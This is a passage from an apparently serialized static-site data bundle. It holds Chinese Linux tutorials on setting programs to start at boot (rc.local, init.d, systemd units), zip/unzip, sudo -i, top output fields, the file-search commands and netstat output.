00:00:00 grep --color=auto diodon \n\n\n1\n2\n3\n\n\n就可以看到diodon进程已经在后台运行。\n\n\n# 删除\n\n既然有添加，就必须得有删除，其实以rc.local的删除方式很简单，直接删除rc.local中用户添加的部分即可。\n\n需要提醒的是，在操作系统文件时，做备份是非常必要的\n\n\n# 将用户脚本添加到/etc/init.d中\n\n\n# 添加用户进程\n\n第二种方式就是将自己的用户脚本添加到/etc/init.d并链接到自启动程序当中。\n\n还是以diodon软件来举例，我编辑一个运行diodon的脚本：\n\n#!/bin/bash\n./usr/bin/diodon \n\n\n1\n2\n\n\n将其命名为diodon.sh,并用指令：\n\nchmod +x diodon.sh\nsudo cp diodon.sh /etc/init.d/ \n\n\n1\n2\n\n\n将文件放到/etc/init.d目录中，然后将diodon,sh脚本链接到开机运行序列中：\n\ncd /etc/init.d\nsudo update-rc.d diodon.sh defaults 96\ninsserv: warning: script \'diodon\' missing lsb tags and overrides \n\n\n1\n2\n3\n\n\n这样重新启动时，就可以看到diodon.sh正在运行了。 sudo update-rc.d diodon.sh defaults 96 在这条指令中，update-rc.d是一个系统的链接工具。\n\n而defaults 96则是指定了脚本的开机顺序，数字为0-99，数字越大执行优先级越低，用户添加的程序最好选择低优先级的执行顺序，因为很可能我们的用户程序会依赖一些系统的应用进程，例如如果应用程序要使用到网络部分，就先得让网络后台程序先初始化完毕。\n\n看到这里，细心的朋友已经发现了，在链接脚本时有一个警告：\n\ninsserv: warning: script \'diodon\' missing lsb tags and overrides \n\n\n1\n\n\n作为一个菜鸟而言，是不敢忽视任何警告的，所以只好求助google，解决办法是在自己的脚本中的#!/bin/bash下添加：\n\n### begin init info\n# provides:          downey\n# required-start:    $local_fs $network\n# required-stop:     $local_fs\n# default-start:     2 3 4 5\n# default-stop:      0 1 6\n# short-description: tomcat service\n# description:       tomcat service daemon\n### end init info \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n添加这些的目的是告诉系统一些关于这个启动脚本的具体信息,其中比较重要的有这几项：\n\n# required-start:   运行这个脚本需要的环境\n# required-start:   停止这个脚本需要的环境\n# default-start:    提供运行的运行级别\n# default-stop:     不运行的运行级别\n# description:      描述 \n\n\n1\n2\n3\n4\n5\n\n\n关于linux下的运行级别参考:linux运行级别\n\n\n# 删除用户进程\n\n既然有添加就必然有删除，如果需要删除自定义开机运行脚本，输入：\n\nsudo update-rc.d -f diodon remove \n\n\n1\n\n\n\n# systemd的开机自启动\n\n上面提到的两种方式适用于经典的system v控制系统启动和关闭的情况，但是目前(2018年10月)在大多数发行版上都开始使用了systemd的系统软件控制方式，包括ubuntu16，centos.systemd系统管理着linux下的进程运行，属于应用程序，不属于linux内核的范畴。\n\n在systemd系统上设置开机自启动的方式也是非常简单的(尽管systemd这套软件管理工具并不简单)。\n\n\n# 确定系统是否应用了systemd工具来管理\n\n这里要注意的是，systemd是linux发行版上的预装工具，用来管理系统软件的启动运行和结束，所以通常来说，这套东西是依赖于发行版的，如果系统使用了这一套工具，那么就可以使用它来管理进程，如果不是，即使你安装了它，它也不会被默认配置为系统管理工具。\n\n查看系统是否使用systemd工具我们可以使用如下的指令：\n\nsystemd --version \n\n\n1\n\n\n如果系统返回如下类似的信息，表明该系统是由systemd工具来管理软件：\n\nsystemd 232\n+pam +audit +selinux +ima +apparmor +smack +sysvinit +utmp +libcryptsetup +gcrypt +gnutls +acl +xz +lz4 +seccomp +blkid +elfutils +kmod +idn \n\n\n1\n2\n\n\n\n# systemctl的使用\n\n对软件的管理主要是同通过systemd工具中的systemctl命令，相比于之前的system v的控制方式，systemd显得更加简洁明了，对用户更加友好，拿httpd来举例：\n\n开启httpd服务：\nsudo systemctl start httpd\n设置httpd服务自启动：\nsudo systemctl enable httpd \n\n\n1\n2\n3\n4\n\n\n至于关闭和取消自启动，大家心里应该有数了吧。\n\n\n# 设置开机自启动\n\n我们再回到重点，设置开机自启动。\n\n我们要为目标设置一个配置文件，其实这是可以预想到的，linux作为一个复杂的系统，开机自启动涉及到的依赖、运行级别、运行环境等等问题肯定需要用户去指定，在启动的时候系统才知道怎么正确地去运行软件。这个配置文件固定以.service作为后缀，比如我们如果要运行/home/downey目录下的test.sh脚本，我们可以添加一个配置文件***test.service***:\n\n[unit]\ndescription=\ndocumentation=\nafter=network.target\nwants=\nrequires=\n\n[service]\nexecstart=/home/downey/test.sh\nexecstop=\nexecreload=/home/downey/test.sh\ntype=simple\n\n[install]\nwantedby=multi-user.target \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n将文件放在/usr/lib/systemd/system 或者 /etc/systemd/system目录下，然后可以测试一下：\n\nsudo systemctl start test.service \n\n\n1\n\n\n然后你可以查看你的/home/downey/test.sh脚本是否已经运行，如果已经运行表示配置文件没有问题。然后可以键入：\n\nsudo systemctl enable test.service \n\n\n1\n\n\n设置test脚本开机启动。如果上一步没有出问题，这一步基本上也不会有什么问题，系统会打印出如下信息：\n\ncreated symlink /etc/systemd/system/multi-user.target.wants/test.service → /usr/lib/systemd/system/test.service. \n\n\n1\n\n\n可以看到，这里在/etc/systemd/system/multi-user.target.wants/目录下创建了一个/usr/lib/systemd/system/test.service文件的软链接，到这里设置开机自启动就完成了。\n\n\n# 配置文件的简单解析\n\n在上面的配置文件中，为了演示起见，我将一些本测试脚本不需要但是比较重要的配置项也写了出来，其实如果不需要可以删除，但是[unit]/[service]/[install]这三个标签需要保留。 我们来一个个简单介绍一下配置项：\n\ndescription：运行软件描述\ndocumentation：软件的文档\nafter：因为软件的启动通常依赖于其他软件，这里是指定在哪个服务被启动之后再启动，设置优先级\nwants：弱依赖于某个服务，目标服务的运行状态可以影响到本软件但不会决定本软件运行状态\nrequires：强依赖某个服务，目标服务的状态可以决定本软件运行。\nexecstart：执行命令\nexecstop：停止执行命令\nexecreload：重启时的命令\ntype：软件运行方式，默认为simple\nwantedby：这里相当于设置软件，选择运行在linux的哪个运行级别，只是在systemd中不在有运行级别概念，但是这里权当这么理解。 \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n如果有多项，用逗号作为分隔。',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"linux解压缩 zip和unzip命令_",frontmatter:{title:"linux解压缩 zip和unzip命令_",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/faeee1/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/10.linux%E8%A7%A3%E5%8E%8B%E7%BC%A9%20zip%E5%92%8Cunzip%E5%91%BD%E4%BB%A4_.html",relativePath:"08.软件使用/05.linux/10.linux解压缩 zip和unzip命令_.md",key:"v-1db89efd",path:"/pages/faeee1/",headersStr:null,content:"压缩文件：\n\nzip 压缩文件名称.zip 被压缩文件夹或文件名称\n\n\n1\n\n\n压缩文件夹：\n\nzip 压缩文件名称.zip - 被压缩文件夹或文件名称\n\n\n1\n\n\n解压文件\n\nunzip 压缩文件\n\n\n1\n\n\n解压文件到指定目录\n\nunzip 压缩文件 -d 位置\n\n\n1\n",normalizedContent:"压缩文件：\n\nzip 压缩文件名称.zip 被压缩文件夹或文件名称\n\n\n1\n\n\n压缩文件夹：\n\nzip 压缩文件名称.zip - 被压缩文件夹或文件名称\n\n\n1\n\n\n解压文件\n\nunzip 压缩文件\n\n\n1\n\n\n解压文件到指定目录\n\nunzip 压缩文件 -d 位置\n\n\n1\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"linux无root用户密码,频繁操作需要提权的命令，不用每次都加sudo的方法",frontmatter:{title:"linux无root用户密码,频繁操作需要提权的命令，不用每次都加sudo的方法",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/4f0801/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/12.linux%E6%97%A0root%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81,%E9%A2%91%E7%B9%81%E6%93%8D%E4%BD%9C%E9%9C%80%E8%A6%81%E6%8F%90%E6%9D%83%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%B8%8D%E7%94%A8%E6%AF%8F%E6%AC%A1%E9%83%BD%E5%8A%A0sudo%E7%9A%84%E6%96%B9%E6%B3%95.html",relativePath:"08.软件使用/05.linux/12.linux无root用户密码,频繁操作需要提权的命令，不用每次都加sudo的方法.md",key:"v-10fcdd50",path:"/pages/4f0801/",headersStr:null,content:"sudo -i，加载用户变量，并跳转到目标用户home目录；\nsudo -s，不加载用户变量，不跳转目录；\n\n\n1\n2\n\n\nsudo -i: 为了频繁的执行某些只有超级用户才能执行的权限，而不用每次输入密码，可以使用该命令。提示输入密码时该密码为当前账户的密码。没有时间限制。执行该命令后提示符变为“#”而不是“$”。想退回普通账户时可以执行“exit”或“logout” 。 要求执行该命令的用户必须在sudoers中才可以",normalizedContent:"sudo -i，加载用户变量，并跳转到目标用户home目录；\nsudo -s，不加载用户变量，不跳转目录；\n\n\n1\n2\n\n\nsudo -i: 为了频繁的执行某些只有超级用户才能执行的权限，而不用每次输入密码，可以使用该命令。提示输入密码时该密码为当前账户的密码。没有时间限制。执行该命令后提示符变为“#”而不是“$”。想退回普通账户时可以执行“exit”或“logout” 。 要求执行该命令的用户必须在sudoers中才可以",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Linux中top命令参数详解",frontmatter:{title:"Linux中top命令参数详解",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/3e52ee/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/13.Linux%E4%B8%ADtop%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3.html",relativePath:"08.软件使用/05.linux/13.Linux中top命令参数详解.md",key:"v-34c17ad4",path:"/pages/3e52ee/",headers:[{level:2,title:"一、top前5行统计信息",slug:"一、top前5行统计信息",normalizedTitle:"一、top前5行统计信息",charIndex:517},{level:3,title:"二、进程信息",slug:"二、进程信息",normalizedTitle:"二、进程信息",charIndex:2211},{level:2,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:2957},{level:2,title:"参考文献",slug:"参考文献",normalizedTitle:"参考文献",charIndex:3378}],headersStr:"一、top前5行统计信息 二、进程信息 其他 参考文献",content:'# top命令用法\n\ntop命令经常用来监控的系统状况，是常用的性能分析工具，能够实时显示系统中各个进程的资源占用情况。\n\ntop的使用方式 top [-d number] | top [-bnp]\n\n参数解释：\n\n * -d：number代表秒数，表示top命令显示的页面更新一次的间隔。默认是5秒。\n * -b：以批次的方式执行top。\n * -n：与-b配合使用，表示需要进行几次top命令的输出结果。\n * -p：指定特定的pid进程号进行观察。\n\n在top命令显示的页面还可以输入以下按键执行相应的功能（注意大小写区分的）：\n\n * ?：显示在top当中可以输入的命令\n * P：以CPU的使用资源排序显示\n * M：以内存的使用资源排序显示\n * N：以pid排序显示\n * T：由进程使用的时间累计排序显示\n * k：给某一个pid一个信号。可以用来杀死进程\n * r：给某个pid重新定制一个nice值（即优先级）\n * q：退出top（用ctrl+c也可以退出top）。\n\n\n# top各输出参数含义\n\n下面是使用top命令来进行性能检测的截图：\n\n图一(ubuntu)：\n\n\n\n图二(centos)：\n\n\n\n\n# 一、top前5行统计信息\n\n第1行：top - 05:43:27 up 4:52, 2 users, load average: 0.58, 0.41, 0.30  第1行是任务队列信息，其参数如下：\n\n内容                               含义\n05:43:27                         表示当前时间\nup 4:52                          系统运行时间 格式为时：分\n2 users                          当前登录用户数\nload average: 0.58, 0.41, 0.30   系统负载，即任务队列的平均长度。 三个数值分别为 1分钟、5分钟、15分钟前到现在的平均值。\n\nload average: 如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。\n\n第2行：Tasks: 159 total, 1 running, 158 sleeping, 0 stopped, 0 zombie  第3行：%Cpu(s): 37.0 us, 3.7 sy, 0.0 ni, 59.3 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st  第2、3行为进程和CPU的信息  当有多个CPU时，这些内容可能会超过两行，其参数如下：\n\n内容             含义\n159 total      进程总数\n1 running      正在运行的进程数\n158 sleeping   睡眠的进程数\n0 stopped      停止的进程数\n0 zombie       僵尸进程数\n37.0 us        用户空间占用CPU百分比\n3.7 sy         内核空间占用CPU百分比\n0.0 ni         用户进程空间内改变过优先级的进程占用CPU百分比\n59.3 id        空闲CPU百分比\n0.0 wa         等待输入输出的CPU时间百分比\n0.0 hi         硬中断（Hardware IRQ）占用CPU的百分比\n0.0 si         软中断（Software Interrupts）占用CPU的百分比\n0.0 st         \n\n第4行：KiB Mem: 1530752 total, 1481968 used, 48784 free, 70988 buffers  第5行：KiB Swap: 3905532 total, 267544 used, 3637988 free. 617312 cached Mem  第4、5行为内存信息  其参数如下：\n\n内容                          含义\nKiB Mem: 1530752 total      物理内存总量\n1481968 used                使用的物理内存总量\n48784 free                  空闲内存总量\n70988 buffers（buff/cache）   用作内核缓存的内存量\nKiB Swap: 3905532 total     交换区总量\n267544 used                 使用的交换区总量\n3637988 free                空闲交换区总量\n617312 cached Mem           缓冲的交换区总量。\n3156100 avail Mem           代表可用于进程下一次分配的物理内存数量\n\n上述最后提到的缓冲的交换区总量，这里解释一下，所谓缓冲的交换区总量，即内存中的内容被换出到交换区，而后又被换入到内存，但使用过的交换区尚未被覆盖，该数值即为这些内容已存在于内存中的交换区的大小。相应的内存再次被换出时可不必再对交换区写入。\n\n计算可用内存数有一个近似的公式：  第四行的free + 第四行的buffers + 第五行的cached\n\n\n# 二、进程信息\n\n列名        含义\nPID       进程id\nPPID      父进程id\nRUSER     Real user name\nUID       进程所有者的用户id\nUSER      进程所有者的用户名\nGROUP     进程所有者的组名\nTTY       启动进程的终端名。不是从终端启动的进程则显示为 ?\nPR        优先级\nNI        nice值。负值表示高优先级，正值表示低优先级\nP         最后使用的CPU，仅在多CPU环境下有意义\n%CPU      上次更新到现在的CPU时间占用百分比\nTIME      进程使用的CPU时间总计，单位秒\nTIME+     进程使用的CPU时间总计，单位1/100秒\n%MEM      进程使用的物理内存百分比\nVIRT      进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES\nSWAP      进程使用的虚拟内存中，被换出的大小，单位kb\nRES       进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA\nCODE      可执行代码占用的物理内存大小，单位kb\nDATA      可执行代码以外的部分(数据段+栈)占用的物理内存大小，单位kb\nSHR       共享内存大小，单位kb\nnFLT      页面错误次数\nnDRT      最后一次写入到现在，被修改过的页面数。\nS         进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程\nCOMMAND   命令名/命令行\nWCHAN     若该进程在睡眠，则显示睡眠中的系统函数名\nFlags     任务标志\n\n\n# 其他\n\n默认进入top时，各进程是按照CPU的占用量来排序的。\n\n1、在top基本视图中，按键盘数字“1”可以监控每个逻辑CPU的状况：\n\n  2、敲击键盘‘b’（打开关闭加亮效果）top视图变换如下：\n\n\n\nPID为16283为当前top视图中唯一的运行态进程。也可以敲击键盘‘y’来打开或者关闭运行态进程的加亮效果。\n\n3、敲击键盘‘x’（打开/关闭排序列的加亮效果），top视图变换如下：\n\n\n\n可以看到现在是按"%CPU"进行排序的，可以按”shift+>”或者”shift+<”左右改变排序序列。\n\n4、改变进程显示字段\n\n在top基本视图中，敲击”f”进入另一个视图，在这里可以编辑基本视图中的显示字段：\n\n\n\n用上下键选择选项，按下空格键可以决定是否在基本视图中显示这个选项。\n\ntop命令是一个非常强大的功能，但是它监控的最小单位是进程，如果想监控更小单位时，就需要用到ps或者netstate命令来满足我们的要求。\n\n\n# 参考文献\n\n1、https://blog.csdn.net/quiet_girl/article/details/50668126\n\n2、http://www.zhimengzhe.com/linux/298422.html',normalizedContent:'# top命令用法\n\ntop命令经常用来监控的系统状况，是常用的性能分析工具，能够实时显示系统中各个进程的资源占用情况。\n\ntop的使用方式 top [-d number] | top [-bnp]\n\n参数解释：\n\n * -d：number代表秒数，表示top命令显示的页面更新一次的间隔。默认是5秒。\n * -b：以批次的方式执行top。\n * -n：与-b配合使用，表示需要进行几次top命令的输出结果。\n * -p：指定特定的pid进程号进行观察。\n\n在top命令显示的页面还可以输入以下按键执行相应的功能（注意大小写区分的）：\n\n * ?：显示在top当中可以输入的命令\n * p：以cpu的使用资源排序显示\n * m：以内存的使用资源排序显示\n * n：以pid排序显示\n * t：由进程使用的时间累计排序显示\n * k：给某一个pid一个信号。可以用来杀死进程\n * r：给某个pid重新定制一个nice值（即优先级）\n * q：退出top（用ctrl+c也可以退出top）。\n\n\n# top各输出参数含义\n\n下面是使用top命令来进行性能检测的截图：\n\n图一(ubuntu)：\n\n\n\n图二(centos)：\n\n\n\n\n# 一、top前5行统计信息\n\n第1行：top - 05:43:27 up 4:52, 2 users, load average: 0.58, 0.41, 0.30  第1行是任务队列信息，其参数如下：\n\n内容                               含义\n05:43:27                         表示当前时间\nup 4:52                          系统运行时间 格式为时：分\n2 users                          当前登录用户数\nload average: 0.58, 0.41, 0.30   系统负载，即任务队列的平均长度。 三个数值分别为 1分钟、5分钟、15分钟前到现在的平均值。\n\nload average: 如果这个数除以逻辑cpu的数量，结果高于5的时候就表明系统在超负荷运转了。\n\n第2行：tasks: 159 total, 1 running, 158 sleeping, 0 stopped, 0 zombie  第3行：%cpu(s): 37.0 us, 3.7 sy, 0.0 ni, 59.3 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st  第2、3行为进程和cpu的信息  当有多个cpu时，这些内容可能会超过两行，其参数如下：\n\n内容             含义\n159 total      进程总数\n1 running      正在运行的进程数\n158 sleeping   睡眠的进程数\n0 stopped      停止的进程数\n0 zombie       僵尸进程数\n37.0 us        用户空间占用cpu百分比\n3.7 sy         内核空间占用cpu百分比\n0.0 ni         用户进程空间内改变过优先级的进程占用cpu百分比\n59.3 id        空闲cpu百分比\n0.0 wa         等待输入输出的cpu时间百分比\n0.0 hi         硬中断（hardware irq）占用cpu的百分比\n0.0 si         软中断（software interrupts）占用cpu的百分比\n0.0 st         \n\n第4行：kib mem: 1530752 total, 1481968 used, 48784 free, 70988 buffers  第5行：kib swap: 3905532 total, 267544 used, 3637988 free. 617312 cached mem  第4、5行为内存信息  其参数如下：\n\n内容                          含义\nkib mem: 1530752 total      物理内存总量\n1481968 used                使用的物理内存总量\n48784 free                  空闲内存总量\n70988 buffers（buff/cache）   用作内核缓存的内存量\nkib swap: 3905532 total     交换区总量\n267544 used                 使用的交换区总量\n3637988 free                空闲交换区总量\n617312 cached mem           缓冲的交换区总量。\n3156100 avail mem           代表可用于进程下一次分配的物理内存数量\n\n上述最后提到的缓冲的交换区总量，这里解释一下，所谓缓冲的交换区总量，即内存中的内容被换出到交换区，而后又被换入到内存，但使用过的交换区尚未被覆盖，该数值即为这些内容已存在于内存中的交换区的大小。相应的内存再次被换出时可不必再对交换区写入。\n\n计算可用内存数有一个近似的公式：  第四行的free + 第四行的buffers + 第五行的cached\n\n\n# 二、进程信息\n\n列名        含义\npid       进程id\nppid      父进程id\nruser     real user name\nuid       进程所有者的用户id\nuser      进程所有者的用户名\ngroup     进程所有者的组名\ntty       启动进程的终端名。不是从终端启动的进程则显示为 ?\npr        优先级\nni        nice值。负值表示高优先级，正值表示低优先级\np         最后使用的cpu，仅在多cpu环境下有意义\n%cpu      上次更新到现在的cpu时间占用百分比\ntime      进程使用的cpu时间总计，单位秒\ntime+     进程使用的cpu时间总计，单位1/100秒\n%mem      进程使用的物理内存百分比\nvirt      进程使用的虚拟内存总量，单位kb。virt=swap+res\nswap      进程使用的虚拟内存中，被换出的大小，单位kb\nres       进程使用的、未被换出的物理内存大小，单位kb。res=code+data\ncode      可执行代码占用的物理内存大小，单位kb\ndata      可执行代码以外的部分(数据段+栈)占用的物理内存大小，单位kb\nshr       共享内存大小，单位kb\nnflt      页面错误次数\nndrt      最后一次写入到现在，被修改过的页面数。\ns         进程状态。d=不可中断的睡眠状态 r=运行 s=睡眠 t=跟踪/停止 z=僵尸进程\ncommand   命令名/命令行\nwchan     若该进程在睡眠，则显示睡眠中的系统函数名\nflags     任务标志\n\n\n# 其他\n\n默认进入top时，各进程是按照cpu的占用量来排序的。\n\n1、在top基本视图中，按键盘数字“1”可以监控每个逻辑cpu的状况：\n\n  2、敲击键盘‘b’（打开关闭加亮效果）top视图变换如下：\n\n\n\npid为16283为当前top视图中唯一的运行态进程。也可以敲击键盘‘y’来打开或者关闭运行态进程的加亮效果。\n\n3、敲击键盘‘x’（打开/关闭排序列的加亮效果），top视图变换如下：\n\n\n\n可以看到现在是按"%cpu"进行排序的，可以按”shift+>”或者”shift+<”左右改变排序序列。\n\n4、改变进程显示字段\n\n在top基本视图中，敲击”f”进入另一个视图，在这里可以编辑基本视图中的显示字段：\n\n\n\n用上下键选择选项，按下空格键可以决定是否在基本视图中显示这个选项。\n\ntop命令是一个非常强大的功能，但是它监控的最小单位是进程，如果想监控更小单位时，就需要用到ps或者netstate命令来满足我们的要求。\n\n\n# 参考文献\n\n1、https://blog.csdn.net/quiet_girl/article/details/50668126\n\n2、http://www.zhimengzhe.com/linux/298422.html',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"linux中whereis、which、find、location的区别和用法",frontmatter:{title:"linux中whereis、which、find、location的区别和用法",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/d88157/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/14.linux%E4%B8%ADwhereis%E3%80%81which%E3%80%81find%E3%80%81location%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%94%A8%E6%B3%95.html",relativePath:"08.软件使用/05.linux/14.linux中whereis、which、find、location的区别和用法.md",key:"v-60792079",path:"/pages/d88157/",headersStr:null,content:'# 1. find\n\nfind是最常见和最强大的查找命令，你可以用它找到任何你想找的文件。\n\nfind的使用格式如下：\n\n$ find <指定目录> <指定条件> <指定动作>\n\n- <指定目录>： 所要搜索的目录及其所有子目录。默认为当前目录。\n\n- <指定条件>： 所要搜索的文件的特征。\n\n- <指定动作>： 对搜索结果进行特定的处理。\n\n如果什么参数也不加，find默认搜索当前目录及其子目录，并且不过滤任何结果（也就是返回所有文件），将它们全都显示在屏幕上。\n\nfind的使用实例：\n\n$ find . -name "my"*\n\n搜索当前目录（含子目录，以下同）中，所有文件名以my开头的文件。\n\n$ find . -name "my" -ls*\n\n搜索当前目录中，所有文件名以my开头的文件，并显示它们的详细信息。\n\n$ find . -type f -mmin -10\n\n搜索当前目录中，所有过去10分钟中更新过的普通文件。如果不加-type f参数，则搜索普通文件+特殊文件+目录。\n\n\n\n\n# 2. locate\n\nlocate命令其实是“find -name”的另一种写法，但是要比后者快得多，原因在于它不搜索具体目录，而是搜索一个数据库（/var/lib/locatedb），这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次，所以使用locate命令查不到最新变动过的文件。为了避免这种情况，可以在使用locate之前，先使用updatedb命令，手动更新数据库。\n\nlocate命令的使用实例：\n\n$ locate /etc/sh\n\n搜索etc目录下所有以sh开头的文件。\n\n$ locate ~/m\n\n搜索用户主目录下，所有以m开头的文件。\n\n$ locate -i ~/m\n\n搜索用户主目录下，所有以m开头的文件，并且忽略大小写。\n\n\n# 3. whereis\n\nwhereis命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。\n\nwhereis命令的使用实例：\n\n$ whereis grep\n\n\n\n\n# 4. which\n\nwhich命令的作用是，在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。\n\n',normalizedContent:'# 1. find\n\nfind是最常见和最强大的查找命令，你可以用它找到任何你想找的文件。\n\nfind的使用格式如下：\n\n$ find <指定目录> <指定条件> <指定动作>\n\n- <指定目录>： 所要搜索的目录及其所有子目录。默认为当前目录。\n\n- <指定条件>： 所要搜索的文件的特征。\n\n- <指定动作>： 对搜索结果进行特定的处理。\n\n如果什么参数也不加，find默认搜索当前目录及其子目录，并且不过滤任何结果（也就是返回所有文件），将它们全都显示在屏幕上。\n\nfind的使用实例：\n\n$ find . -name "my"*\n\n搜索当前目录（含子目录，以下同）中，所有文件名以my开头的文件。\n\n$ find . -name "my" -ls*\n\n搜索当前目录中，所有文件名以my开头的文件，并显示它们的详细信息。\n\n$ find . -type f -mmin -10\n\n搜索当前目录中，所有过去10分钟中更新过的普通文件。如果不加-type f参数，则搜索普通文件+特殊文件+目录。\n\n\n\n\n# 2. locate\n\nlocate命令其实是“find -name”的另一种写法，但是要比后者快得多，原因在于它不搜索具体目录，而是搜索一个数据库（/var/lib/locatedb），这个数据库中含有本地所有文件信息。linux系统自动创建这个数据库，并且每天自动更新一次，所以使用locate命令查不到最新变动过的文件。为了避免这种情况，可以在使用locate之前，先使用updatedb命令，手动更新数据库。\n\nlocate命令的使用实例：\n\n$ locate /etc/sh\n\n搜索etc目录下所有以sh开头的文件。\n\n$ locate ~/m\n\n搜索用户主目录下，所有以m开头的文件。\n\n$ locate -i ~/m\n\n搜索用户主目录下，所有以m开头的文件，并且忽略大小写。\n\n\n# 3. whereis\n\nwhereis命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。\n\nwhereis命令的使用实例：\n\n$ whereis grep\n\n\n\n\n# 4. which\n\nwhich命令的作用是，在path变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。\n\n',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"netstat命令的使用",frontmatter:{title:"netstat命令的使用",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/5f99fb/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/15.netstat%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"08.软件使用/05.linux/15.netstat命令的使用.md",key:"v-501d642e",path:"/pages/5f99fb/",headersStr:null,content:'> https://www.bilibili.com/video/BV1cL411H7cj?spm_id_from=333.999.0.0\n\n\n# 简介\n\nNetstat 命令用于显示各种网络相关信息，如网络连接，路由表，接口状态 (Interface Statistics)，masquerade 连接，多播成员 (Multicast Memberships) 等等。\n\n\n# 输出信息含义\n\n执行netstat后，其输出结果为\n\nActive Internet connections (w/o servers)\nProto Recv-Q Send-Q Local Address Foreign Address State\ntcp 0 2 210.34.6.89:telnet 210.34.6.96:2873 ESTABLISHED\ntcp 296 0 210.34.6.89:1165 210.34.6.84:netbios-ssn ESTABLISHED\ntcp 0 0 localhost.localdom:9001 localhost.localdom:1162 ESTABLISHED\ntcp 0 0 localhost.localdom:1162 localhost.localdom:9001 ESTABLISHED\ntcp 0 80 210.34.6.89:1161 210.34.6.10:netbios-ssn CLOSE\n\nActive UNIX domain sockets (w/o servers)\nProto RefCnt Flags Type State I-Node Path\nunix 1 [ ] STREAM CONNECTED 16178 @000000dd\nunix 1 [ ] STREAM CONNECTED 16176 @000000dc\nunix 9 [ ] DGRAM 5292 /dev/log\nunix 1 [ ] STREAM CONNECTED 16182 @000000df\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n从整体上看，netstat的输出结果可以分为两个部分：\n\n一个是Active Internet connections，称为有源TCP连接，其中"Recv-Q"和"Send-Q"指%0A的是接收队列和发送队列。这些数字一般都应该是0。如果不是则表示软件包正在队列中堆积。这种情况只能在非常少的情况见到。\n\n另一个是Active UNIX domain sockets，称为有源Unix域套接口(和网络套接字一样，但是只能用于本机通信，性能可以提高一倍)。 Proto显示连接使用的协议,RefCnt表示连接到本套接口上的进程号,Types显示套接口的类型,State显示套接口当前的状态,Path表示连接到套接口的其它进程使用的路径名。\n\n常见参数 -a (all)显示所有选项，默认不显示LISTEN相关 -t (tcp)仅显示tcp相关选项 -u (udp)仅显示udp相关选项 -n 拒绝显示别名，能显示数字的全部转化成数字。 -l 仅列出有在 Listen (监听) 的服務状态\n\n-p 显示建立相关链接的程序名 -r 显示路由信息，路由表 -e 显示扩展信息，例如uid等 -s 按各个协议进行统计 -c 每隔一个固定时间，执行该netstat命令。\n\n提示：LISTEN和LISTENING的状态只有用-a或者-l才能看到\n\n常用命令：\n\nnetstat -nutlp\n\n\n1\n',normalizedContent:'> https://www.bilibili.com/video/bv1cl411h7cj?spm_id_from=333.999.0.0\n\n\n# 简介\n\nnetstat 命令用于显示各种网络相关信息，如网络连接，路由表，接口状态 (interface statistics)，masquerade 连接，多播成员 (multicast memberships) 等等。\n\n\n# 输出信息含义\n\n执行netstat后，其输出结果为\n\nactive internet connections (w/o servers)\nproto recv-q send-q local address foreign address state\ntcp 0 2 210.34.6.89:telnet 210.34.6.96:2873 established\ntcp 296 0 210.34.6.89:1165 